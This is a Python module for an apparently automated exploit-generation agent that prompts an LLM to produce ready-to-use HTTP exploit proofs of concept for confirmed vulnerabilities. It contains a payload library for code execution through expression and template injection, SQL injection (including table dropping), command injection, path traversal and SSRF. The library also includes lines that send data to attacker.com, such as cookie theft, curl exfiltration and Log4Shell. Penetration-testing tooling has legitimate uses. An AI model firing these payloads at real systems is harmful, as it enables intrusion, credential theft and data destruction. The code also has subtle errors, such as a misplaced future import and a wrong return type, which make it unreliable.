"""
Agent-S：PoC 生成与验证。

工作流：
1. 接收 Agent-R 确认的真实漏洞（ReviewResult）。
2. 根据引擎类型从内置 Payload 策略库选取候选载荷。
3. 调用 LLM，结合实际源码上下文，定制化生成可直接使用的 Exploit PoC。
4. 以结构化 JSON 输出载荷、HTTP 触发步骤与预期回显。
"""

from __future__ import annotations

import json
import logging
import os
import re
from dataclasses import dataclass, field
from typing import Optional

from langchain_core.messages import HumanMessage, SystemMessage
from langchain_core.output_parsers import StrOutputParser
from langchain_openai import ChatOpenAI

from __future__ import annotations as _annotations  # noqa: F401 – 允许前向引用

from src.agents.agent_r import ReviewResult

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# 内置 Payload 策略库
# ---------------------------------------------------------------------------

_PAYLOAD_STRATEGIES: dict[str, list[str]] = {
    # ── 表达式注入 ───────────────────────────────────────────────────────
    "spring el": [
        "T(java.lang.Runtime).getRuntime().exec('id')",
        "T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/sh','-c','id'})",
        "T(java.lang.ProcessBuilder).new(new String[]{'/bin/sh','-c','id'}).start()",
        "T(java.lang.System).getenv()",
    ],
    "ognl": [
        "@java.lang.Runtime@getRuntime().exec('id')",
        "@java.lang.Runtime@getRuntime().exec(new String[]{'/bin/sh','-c','id'})",
        "#_memberAccess['allowStaticMethodAccess']=true,@java.lang.Runtime@getRuntime().exec('id')",
    ],
    "mvel": [
        "Runtime.getRuntime().exec('id')",
        "new java.util.Scanner(Runtime.getRuntime().exec('id').getInputStream()).useDelimiter('\\\\A').next()",
    ],
    "jinja2": [
        "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}",
        "{{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip() }}",
        "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{% endfor %}",
    ],
    "mako": [
        "${__import__('os').popen('id').read()}",
        "<%\nimport os\n%>\n${os.popen('id').read()}",
    ],

    # ── SQL 注入 ─────────────────────────────────────────────────────────
    "sql injection": [
        "' OR '1'='1",
        "' OR 1=1--",
        "'; DROP TABLE users--",
        "' UNION SELECT null,username,password FROM users--",
        "1' AND SLEEP(5)--",
        "1; EXEC xp_cmdshell('whoami')--",
    ],
    "sqli": [
        "' OR '1'='1",
        "' UNION SELECT null,null,null--",
        "1 AND 1=2 UNION SELECT table_name,null FROM information_schema.tables--",
    ],

    # ── 命令注入 ─────────────────────────────────────────────────────────
    "command injection": [
        "; id",
        "| id",
        "& id",
        "`id`",
        "$(id)",
        "; cat /etc/passwd",
        "| curl http://attacker.com/$(id)",
        "\n id",
    ],
    "rce": [
        "; id",
        "| whoami",
        "& whoami",
        "$(whoami)",
    ],

    # ── 路径穿越 ─────────────────────────────────────────────────────────
    "path traversal": [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "/etc/passwd%00",
    ],
    "directory traversal": [
        "../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..\\..\\..\\etc\\passwd",
    ],

    # ── SSRF ─────────────────────────────────────────────────────────────
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:22",
        "http://localhost:8080/admin",
        "http://[::1]/admin",
        "file:///etc/passwd",
        "gopher://127.0.0.1:6379/_PING%0D%0A",
        "dict://127.0.0.1:11211/stat",
    ],
    "server-side request forgery": [
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://192.168.1.1",
        "http://internal-service.local/api/secret",
    ],

    # ── XSS ──────────────────────────────────────────────────────────────
    "xss": [
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(document.domain)",
        "'><script>fetch('https://attacker.com/?c='+document.cookie)</script>",
        "<svg/onload=alert(1)>",
    ],
    "cross-site scripting": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(document.domain)>",
    ],

    # ── 反序列化 ──────────────────────────────────────────────────────────
    "insecure deserialization": [
        "rO0AB...（Java序列化gadget chain，需配合ysoserial工具生成）",
        "__reduce__利用（Python pickle）: class Exploit: def __reduce__(self): return os.system, ('id',)",
    ],
    "deserialization": [
        "（Java）使用 ysoserial 生成 CommonsCollections 利用链",
        "（Python）import pickle; pickle.loads(<crafted_bytes>)",
    ],

    # ── 不安全重定向 ─────────────────────────────────────────────────────
    "open redirect": [
        "https://attacker.com",
        "//attacker.com",
        "/\\attacker.com",
        "http://attacker.com%2F@legitimate.com",
    ],

    # ── 日志注入 ──────────────────────────────────────────────────────────
    "log injection": [
        "\r\n[FATAL] Admin password: pwned",
        "%0d%0a[ERROR] Fake log entry",
        "${jndi:ldap://attacker.com/exploit}",  # Log4Shell
    ],
}

# ---------------------------------------------------------------------------
# 数据结构
# ---------------------------------------------------------------------------


@dataclass
class PoCResult:
    """
    Agent-S 生成的 PoC 输出结构。

    Attributes:
        engine:              检测到的引擎或漏洞类别（如 OGNL / SQL Injection）。
        sink_method:         触发漏洞的 Sink 方法全名。
        file_location:       漏洞所在文件和行号。
        payloads:            候选 Payload 列表（由低到高危）。
        http_trigger:        HTTP 请求触发步骤（Method / path / param / example）。
        expected_output:     成功利用时的预期回显特征。
        severity:            风险等级（critical / high / medium）。
        raw_llm_output:      LLM 原始输出，供调试用。
        verification_result: Agent-E 动态验证结果（可选，验证后填充）。
    """

    engine: str
    sink_method: str
    file_location: str
    payloads: list[str] = field(default_factory=list)
    http_trigger: dict[str, str] = field(default_factory=dict)
    expected_output: str = ""
    severity: str = "high"
    raw_llm_output: str = ""
    # Agent-E 填充（扫描时延迟注入，避免循环导入）
    verification_result: Optional[object] = field(default=None, repr=False)

    def to_dict(self) -> dict:
        d: dict = {
            "engine": self.engine,
            "sink_method": self.sink_method,
            "file_location": self.file_location,
            "payloads": self.payloads,
            "http_trigger": self.http_trigger,
            "expected_output": self.expected_output,
            "severity": self.severity,
        }
        if self.verification_result is not None:
            vr = self.verification_result
            if hasattr(vr, "to_dict"):
                d["verification"] = vr.to_dict()  # type: ignore[union-attr]
        return d

    def to_json(self, indent: int = 2) -> str:
        return json.dumps(self.to_dict(), ensure_ascii=False, indent=indent)

    @property
    def is_dynamically_confirmed(self) -> bool:
        """Agent-E 是否已将此 PoC 标记为 100% 确认真实漏洞。"""
        vr = self.verification_result
        if vr is None:
            return False
        return getattr(vr, "is_confirmed", False)


# ---------------------------------------------------------------------------
# Prompt
# ---------------------------------------------------------------------------

_SYSTEM_PROMPT_S = """\
你是一位渗透测试专家，专注于 Java / Python 表达式注入漏洞（SpEL / OGNL / MVEL / Jinja2 / Mako）的利用验证。
你将收到一条已确认的漏洞信息（发现位置 + 源码上下文 + 引擎类型），以及候选 Payload 列表。
请生成一份可直接使用的 PoC 报告，格式为合法 JSON，不要附带任何额外说明。

输出 JSON 格式：
{
  "payloads": ["最可能成功的 payload", "备用 payload 2", ...],
  "http_trigger": {
    "method": "GET 或 POST",
    "path": "/推断的接口路径",
    "param": "触发漏洞的参数名",
    "example": "完整 curl 命令或 HTTP 请求示例"
  },
  "expected_output": "成功利用时的预期回显（如 uid=0(root)...）",
  "severity": "critical | high | medium"
}
"""

_POC_TEMPLATE = """\
【已确认漏洞】
- 引擎类型   : {engine}
- Sink 方法  : {sink_method}
- 漏洞位置   : {file_location}
- 置信度     : {confidence:.0%}
- 分析说明   : {reasoning}

【源码上下文】
```java
{code_context}
```

【候选 Payload 策略（按危险程度排列）】
{payloads}

请根据上述信息，定制生成可直接利用的 HTTP PoC 报告（JSON 格式）。
重点推断：触发漏洞需要调用哪个 HTTP 接口、参数名是什么、Payload 如何构造。
"""

# ---------------------------------------------------------------------------
# 工具函数
# ---------------------------------------------------------------------------


def _match_payloads(engine: str) -> list[str]:
    """根据引擎名称匹配内置 Payload 列表（模糊匹配）。"""
    engine_lower = engine.lower()
    for key, payloads in _PAYLOAD_STRATEGIES.items():
        if key in engine_lower or engine_lower in key:
            return payloads
    # 降级：返回 SpEL 载荷（最常见）
    return _PAYLOAD_STRATEGIES["spring el"]


def _parse_poc_json(raw: str) -> dict:
    """从 LLM 原始输出提取 JSON，容忍 markdown 代码块包裹。"""
    text = raw.strip()
    if "```" in text:
        m = re.search(r"```(?:json)?\s*(.*?)```", text, re.DOTALL)
        if m:
            text = m.group(1).strip()
    try:
        return json.loads(text)
    except json.JSONDecodeError:
        # 降级：返回空结构
        logger.warning("PoC JSON 解析失败，使用内置 Payload 降级输出。")
        return {}


# ---------------------------------------------------------------------------
# Agent-S 主类
# ---------------------------------------------------------------------------


class AgentS:
    """
    PoC 生成 Agent。

    对 Agent-R 确认的每条真实漏洞，结合内置 Payload 策略库与 LLM 推理，
    生成针对实际代码的定制化 HTTP 利用载荷。

    Args:
        llm: LangChain LLM 实例。
    """

    def __init__(self, llm: Optional[ChatOpenAI] = None) -> None:
        self.llm: ChatOpenAI = llm or ChatOpenAI(
            model=os.environ.get("OPENAI_MODEL", "gpt-4o"),
            temperature=0.3,
            base_url=os.environ.get("OPENAI_BASE_URL") or None,
        )
        self._parser = StrOutputParser()

    def _invoke_llm(self, finding: ReviewResult, payloads: list[str]) -> dict:
        """调用 LLM 生成定制化 PoC。"""
        payload_text = "\n".join(f"  {i+1}. {p}" for i, p in enumerate(payloads))
        human_msg = _POC_TEMPLATE.format(
            engine=finding.engine_detected,
            sink_method=finding.sink_method or finding.finding.message[:80],
            file_location=f"{finding.finding.file_uri}:{finding.finding.start_line}",
            confidence=finding.confidence,
            reasoning=finding.reasoning,
            code_context=finding.finding.code_context or "（源码上下文不可用）",
            payloads=payload_text,
        )
        chain = self.llm | self._parser
        raw = chain.invoke([
            SystemMessage(content=_SYSTEM_PROMPT_S),
            HumanMessage(content=human_msg),
        ])
        return _parse_poc_json(raw), raw

    def generate_poc(self, finding: ReviewResult) -> PoCResult:
        """
        为单条确认漏洞生成 PoC。

        Args:
            finding: Agent-R 返回的 ReviewResult（status=VULNERABLE）。

        Returns:
            PoCResult 包含载荷、触发步骤与预期回显。
        """
        logger.info(
            "[Agent-S] 生成 PoC | 引擎: %s | 位置: %s:%d",
            finding.engine_detected,
            finding.finding.file_uri,
            finding.finding.start_line,
        )

        candidate_payloads = _match_payloads(finding.engine_detected)
        poc_data, raw_output = self._invoke_llm(finding, candidate_payloads)

        # 合并 LLM 生成与内置 Payload，LLM 推荐优先
        llm_payloads: list[str] = poc_data.get("payloads", [])
        merged_payloads = llm_payloads or candidate_payloads[:3]

        result = PoCResult(
            engine=finding.engine_detected,
            sink_method=finding.sink_method,
            file_location=f"{finding.finding.file_uri}:{finding.finding.start_line}",
            payloads=merged_payloads,
            http_trigger=poc_data.get("http_trigger", {}),
            expected_output=poc_data.get("expected_output", "uid=0(root)..."),
            severity=poc_data.get("severity", "high"),
            raw_llm_output=raw_output,
        )

        logger.info(
            "[Agent-S] PoC 生成完成 | 风险等级: %s | Payload 数: %d",
            result.severity, len(result.payloads),
        )
        return result

    def generate_all(self, findings: list[ReviewResult]) -> list[PoCResult]:
        """
        批量为所有确认漏洞生成 PoC。

        Args:
            findings: Agent-R 返回的 VULNERABLE 发现列表。

        Returns:
            PoCResult 列表。
        """
        if not findings:
            logger.info("[Agent-S] 无确认漏洞，跳过 PoC 生成。")
            return []

        logger.info("[Agent-S] 开始为 %d 处漏洞生成 PoC...", len(findings))
        results: list[PoCResult] = []
        for finding in findings:
            try:
                poc = self.generate_poc(finding)
                results.append(poc)
            except Exception as exc:  # noqa: BLE001
                logger.warning(
                    "[Agent-S] PoC 生成失败 (%s:%d): %s",
                    finding.finding.file_uri,
                    finding.finding.start_line,
                    exc,
                )
        return results
